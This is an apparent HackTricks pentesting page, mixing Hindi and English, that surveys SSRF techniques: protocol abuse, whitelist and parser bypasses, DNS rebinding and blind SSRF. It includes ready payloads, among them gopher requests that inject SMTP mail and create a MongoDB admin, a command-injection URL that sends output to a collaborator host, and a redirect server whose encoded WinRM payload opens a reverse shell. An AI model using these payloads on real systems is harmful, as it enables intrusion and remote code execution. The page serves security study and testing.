# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

A **Server-side Request Forgery (SSRF)** vulnerability occurs when an attacker manipulates a **server-side application** into making **HTTP requests** to a domain of their choice. This vulnerability exposes the server to arbitrary external requests directed by the attacker.

## Capture SSRF

सबसे पहले आपको अपनी ओर से उत्पन्न SSRF इंटरैक्शन को कैप्चर करना होगा। HTTP या DNS इंटरैक्शन को कैप्चर करने के लिए आप निम्न टूल्स का उपयोग कर सकते हैं:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Whitelisted Domains Bypass

आम तौर पर आप पाएँगे कि SSRF केवल कुछ विशेष whitelisted domains या URL पर ही काम कर रहा होता है। निम्न पेज में आपके पास **whitelist को बायपास करने की तकनीकों का संकलन** उपलब्ध है:


{{#ref}}
url-format-bypass.md
{{#endref}}

### open redirect के माध्यम से बायपास

यदि सर्वर सही तरीके से प्रोटेक्टेड है तो आप वेब पेज के अंदर मौजूद किसी Open Redirect का शोषण करके **सभी प्रतिबंध बायपास** कर सकते हैं। क्योंकि वेबपेज संभवतः **SSRF to the same domain** की अनुमति देगा और शायद **follow redirects** भी करेगा, आप **Open Redirect का उपयोग करके सर्वर को किसी भी अंदरूनी रिसोर्स तक पहुँचाने** के लिए उत्प्रेरित कर सकते हैं।\
अधिक पढ़ें: [https://portswigger.net/web-security/ssrf]

## Protocols

- **file://**
- The URL scheme `file://` is referenced, pointing directly to `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- DICT URL scheme का उपयोग DICT प्रोटोकॉल के माध्यम से definitions या word lists तक पहुँचने के लिए किया जाता है। दिए गए उदाहरण में एक URL का निर्माण दिखाया गया है जो किसी विशेष शब्द, database और entry number को लक्षित करता है, साथ ही एक PHP स्क्रिप्ट के उदाहरण का ज़िक्र है जो attacker-provided credentials का उपयोग करके DICT सर्वर से कनेक्ट करने के लिए गलत तरीके से इस्तेमाल किया जा सकता है: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Secure file transfer over secure shell के लिए प्रयोग होने वाले प्रोटोकॉल के रूप में पहचाना गया है; एक उदाहरण दिया गया है जो दिखाता है कि कैसे एक PHP स्क्रिप्ट को एक malicious SFTP सर्वर से कनेक्ट करने के लिए शोषित किया जा सकता है: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, जो UDP पर चलता है, का उल्लेख एक उदाहरण के साथ किया गया है जहाँ एक PHP स्क्रिप्ट TFTP सर्वर को अनुरोध भेजने के लिए डिज़ाइन की गई है। एक TFTP अनुरोध 'generic.com' पर पोर्ट '12346' के लिए फाइल 'TESTUDPPACKET' के लिए किया गया है: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- यह खंड Lightweight Directory Access Protocol को कवर करता है, और IP नेटवर्क पर वितरित directory information सेवाओं के प्रबंधन और एक्सेस के उपयोग पर ज़ोर देता है। localhost पर एक LDAP सर्वर के साथ इंटरैक्ट करें: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- यहाँ एक पद्धति बताई गई है जिसमें SSRF कमजोरियों का उपयोग करके localhost पर SMTP सेवाओं के साथ इंटरैक्ट किया जा सकता है, जिसमें आंतरिक डोमेन नामों को उजागर करने के चरण और उस जानकारी के आधार पर आगे की जांच करने के उपाय शामिल हैं।
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- यदि SSRF **curl** द्वारा निष्पादित किया जाता है, तो curl में एक फीचर है जिसे [**URL globbing**](https://everything.curl.dev/cmdline/globbing) कहा जाता है जो WAFs को बायपास करने में उपयोगी हो सकता है। उदाहरण के लिए इस [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) में आप **path traversal via `file` protocol** का यह उदाहरण पा सकते हैं:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Gopher प्रोटोकॉल की वह क्षमता कि आप सर्वर संवाद के लिए **IP, port, and bytes** निर्दिष्ट कर सकते हैं, साथ ही payloads तैयार करने के लिए Gopherus और remote-method-guesser जैसे टूल्स का उल्लेख किया गया है। दो अलग-अलग उपयोग दिखाए गए हैं:

### Gopher://

इस प्रोटोकॉल का उपयोग करके आप सर्वर से जो **IP, port and bytes** आप चाहते हैं कि सर्वर **भेजे** उन्हें निर्दिष्ट कर सकते हैं। फिर, आप मूलतः एक SSRF का उपयोग करके **communicate with any TCP server** कर सकते हैं (लेकिन पहले आपको यह पता होना चाहिए कि सेवा से कैसे बात करनी है).\
सौभाग्यवश, आप कई सेवाओं के लिए payloads बनाने के लिए [Gopherus](https://github.com/tarunkant/Gopherus) का उपयोग कर सकते हैं। अतिरिक्त रूप से, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) का उपयोग _gopher_ payloads _Java RMI_ सेवाओं के लिए बनाने में किया जा सकता है।

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — 1337 पर Back connect**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- username=admin, password=admin123 और permission=administrator के साथ user बनाएं
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Others

सर्वरों पर चलने वाला एनालिटिक्स सॉफ़्टवेयर अक्सर incoming links को ट्रैक करने के लिए Referrer header को लॉग करता है, एक ऐसी प्रथा जो अनजाने में applications को Server-Side Request Forgery (SSRF) vulnerabilities के लिए उजागर कर देती है। ऐसा इसलिए है क्योंकि यह सॉफ़्टवेयर Referrer header में बताए गए external URLs पर जाकर referral साइट की सामग्री का विश्लेषण कर सकता है। इन vulnerabilities को खोजने के लिए Burp Suite plugin "**Collaborator Everywhere**" का उपयोग सुझाया जाता है, जो analytics tools द्वारा Referer header को प्रोसेस करने के तरीके का फायदा उठाकर संभावित SSRF attack surfaces की पहचान करता है।

## SSRF via SNI data from certificate

एक गलत कॉन्फ़िगरेशन जो एक साधारण सेटअप के माध्यम से किसी भी backend से कनेक्शन सक्षम कर सकता है, नीचे एक example Nginx configuration में दिखाया गया है:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
इस कॉन्फ़िगरेशन में, Server Name Indication (SNI) फ़ील्ड का मान सीधे backend के पते के रूप में उपयोग किया जाता है। यह सेटअप Server-Side Request Forgery (SSRF) के लिए एक भेद्यता उजागर करता है, जिसे केवल SNI फ़ील्ड में इच्छित IP पता या डोमेन नाम निर्दिष्ट करके एक्सप्लॉइट किया जा सकता है। नीचे `openssl` कमांड का उपयोग करके किसी भी arbitrary backend, जैसे `internal.host.com`, से कनेक्शन मजबूर करने का एक उदाहरण दिया गया है:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF via TLS AIA CA Issuers (Java mTLS)

कुछ TLS stacks मिसिंग intermediate CAs को ऑटो-डाउनलोड कर लेते हैं जो peer certificate के अंदर मौजूद **Authority Information Access (AIA) → CA Issuers** URI का उपयोग करके। **Java** में, mTLS सेवा चलते समय `-Dcom.sun.security.enableAIAcaIssuers=true` सक्षम करने पर सर्वर क्लाइंट सर्टिफिकेट से attacker-controlled URIs को **हैंडशेक के दौरान** dereference कर देता है, HTTP लॉजिक से पहले।

- **Requirements**: mTLS enabled, Java AIA fetching enabled, attacker can present a client cert with a crafted AIA CA Issuers URI.
- **Triggering SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
Java certpath debug आउटपुट `CertStore URI:http://localhost:8080` दिखाता है, और `nc` आउटबाउंड fetch में `-Dhttp.agent` से नियंत्रित `User-Agent` के साथ HTTP request कैप्चर करता है, जो certificate validation के दौरान SSRF साबित करता है।
- **DoS via file://**: Unix-like hosts पर AIA CA Issuers को `file:///dev/urandom` पर सेट करने से Java उसे CertStore की तरह treat करता है और अनबाउंडेड random bytes पढ़ता है, जिससे एक CPU core व्यस्त रहता है और क्लाइंट disconnect के बाद भी subsequent connections ब्लॉक हो जाते हैं।

## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

ऐसा payload आजमाना उपयोगी हो सकता है: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDF रेंडरिंग

यदि वेब पेज स्वचालित रूप से आपकी दी हुई जानकारी से PDF बना रहा है, तो आप **कुछ JS insert कर सकते हैं जो PDF creator** स्वयं (server) द्वारा PDF बनाते समय execute होगा और आप SSRF का दुरुपयोग कर पाएंगे। [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## SSRF से DoS

कई sessions बनाएं और sessions से SSRF का इस्तेमाल करके भारी फाइलें डाउनलोड करने की कोशिश करें।

## SSRF PHP Functions

कमजोर PHP और यहाँ तक कि Wordpress functions के लिए निम्नलिखित पेज देखें:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

कुछ exploitation मामलों में आपको **redirect response भेजने** की आवश्यकता हो सकती है (संभवतः किसी अलग protocol जैसे gopher का उपयोग करने के लिए)। यहाँ redirect के साथ respond करने के लिए विभिन्न python कोड दिए गए हैं:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## SSRF के लिए गलत कॉन्फ़िगर किए गए proxies

ट्रिक्स [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy कमजोर code</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask प्रारंभिक कैरेक्टर के रूप में **`@`** उपयोग करने की अनुमति देता है, जिससे आप **initial host name को username बना सकते हैं** और एक नया host inject कर सकते हैं। Attack request:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

कमजोर कोड:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

यह पता चला कि किसी request के **path की शुरुआत** को character **`;`** से करना संभव है, जो बाद में **`@`** का उपयोग करके एक नया host inject कर के पहुँच प्रदान करने की अनुमति देता है। हमले का अनुरोध:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP बिल्ट-इन वेब सर्वर <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>असुरक्षित PHP कोड</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP URL के path में स्लैश से पहले **char `*`** के उपयोग की अनुमति देता है, हालांकि इसकी कुछ सीमाएँ हैं — यह केवल root pathname `/` के लिए ही इस्तेमाल किया जा सकता है और पहले slash से पहले dots `.` की अनुमति नहीं है; इसलिए उदाहरण के तौर पर dotless-hex encoded IP address का उपयोग करना आवश्यक है:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

अगर आप **problems** का सामना कर रहे हैं ताकि किसी **local IP** से कंटेंट को **exfiltrate** करने में CORS/SOP की वजह से, तो **DNS Rebidding** उस प्रतिबंध को bypass करने के लिए इस्तेमाल किया जा सकता है:


{{#ref}}
../cors-bypass.md
{{#endref}}

### स्वचालित DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) एक tool है जो [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attacks करने के लिए बनाया गया है। इसमें attack server DNS name के IP address को target machine के IP address पर rebind करने और target machine पर मौजूद vulnerable software को exploit करने के लिए attack payloads serve करने के लिए आवश्यक components शामिल हैं।

इसके अलावा **publicly running server** को भी देखें: [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Attack:

1. user/bot से कहें कि वह attacker द्वारा नियंत्रित किसी **domain** को **access** करे
2. उस **DNS** का **TTL** **0** sec है (ताकि victim जल्द ही domain के IP की फिर से जांच करे)
3. victim और attacker के domain के बीच एक **TLS connection** बनती है। attacker **payload** को **Session ID या Session Ticket** के अंदर डाल देता है।
4. वह **domain** अपने ही खिलाफ redirects का एक **infinite loop** शुरू कर देगा। इसका लक्ष्य यह है कि user/bot उस domain तक तब तक पहुंचता रहे जब तक वह domain का **DNS request** फिर से न करे।
5. DNS request में अब एक **private IP** address दिया जाता है (उदाहरण के लिए 127.0.0.1)
6. user/bot TLS connection को **reestablish** करने की कोशिश करेगा और ऐसा करते समय वह **Session** ID/Ticket ID **send** करेगा (जिसमें attacker का **payload** मौजूद था)। तो बधाई — आपने user/bot को खुद पर हमला करने के लिए मना लिया।

ध्यान दें कि इस attack के दौरान, यदि आप localhost:11211 (_memcache_) पर हमला करना चाहते हैं तो victim को initial connection www.attacker.com:11211 से स्थापित करवाना होगा (पोर्ट हमेशा वही होना चाहिए).\
इस attack को **perform** करने के लिए आप इस tool का उपयोग कर सकते हैं: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
अधिक जानकारी के लिए उस talk को देखें जहाँ इस attack को समझाया गया है: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

blind SSRF और non-blind SSRF के बीच फर्क यह है कि blind में आप SSRF request का response नहीं देख पाते। इसलिए exploit करना अधिक कठिन होता है क्योंकि आप केवल well-known vulnerabilities का ही फायदा उठा पाएंगे।

### Time based SSRF

Server के responses के **time** की जांच करके यह पता लगाना संभव हो सकता है कि कोई resource मौजूद है या नहीं (शायद किसी existing resource तक पहुँचने में उन resources के न होने की तुलना में अधिक समय लगे)।

### From blid to full abusing status codes

इस [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/) के अनुसार, कुछ blind SSRF इसलिए हो सकते हैं क्योंकि लक्षित URL 200 status code के साथ जवाब देता है (जैसे AWS metadata), पर वह data सही ढंग से formatted नहीं होता और इसलिए ऐप उसे दिखाने से इनकार कर सकती है।

हालाँकि, यह पाया गया है कि SSRF में 305 से 309 तक के कुछ redirect responses भेजने पर यह संभव हो सकता है कि application इन redirects का पालन करते समय एक **error mode** में चला जाए जो अब data के format की जाँच नहीं करेगा और उसे बस print कर सकता है।

इसे exploit करने के लिए उपयोग किया गया python server निम्नलिखित है:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**कदम:**
- पहले 302 ऐप को redirect का अनुसरण करना शुरू करने पर मजबूर करता है।
- फिर यह 305 → 306 → 307 → 308 → 309 → 310 प्राप्त करता है।
- 5वें अजीब कोड के बाद PoC अंततः 302 → 169.254.169.254 → 200 OK लौटाता है।

**लक्षित के अंदर क्या होता है:**
- libcurl स्वयं 305–310 का अनुसरण करता है; यह केवल अज्ञात कोड्स को “follow.” के रूप में सामान्यीकृत कर देता है।
- N अजीब redirects (यहाँ ≥ 5) के बाद एप्लिकेशन का अपना wrapper तय करता है कि “कुछ गलत है” और debugging के लिए बनाए गए error mode में स्विच कर देता है।
- उस मोड में यह पूरी redirect chain और अंतिम body को बाहरी caller को dump कर देता है।
- परिणाम: attacker हर header + metadata JSON देख लेता है, mission accomplished.

Note that this is interesting to leak status codes that you couldn't leak before (like a 200). However, if somehow you could also select the status code of the response (imagine that you can decide that the AWS metadata responds with a 500 status code), **there might be some status codes that directly leak the content of the response.**

### HTML-to-PDF renderers को blind SSRF gadgets के रूप में

Libraries such as **TCPDF** (and wrappers like **spipu/html2pdf**) will automatically fetch any URLs present in attacker-controlled HTML while rendering a PDF. Each `<img>` or `<link rel="stylesheet">` attribute is resolved server-side via cURL, `getimagesize()`, or `file_get_contents()`, so you can drive the PDF worker to probe internal hosts even though no HTTP response is reflected to you.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 प्रत्येक `<img>` resource के लिए कई retrieval attempts जारी करता है, इसलिए एक single payload कई requests जनरेट कर सकता है (helpful for timing-based port scans).
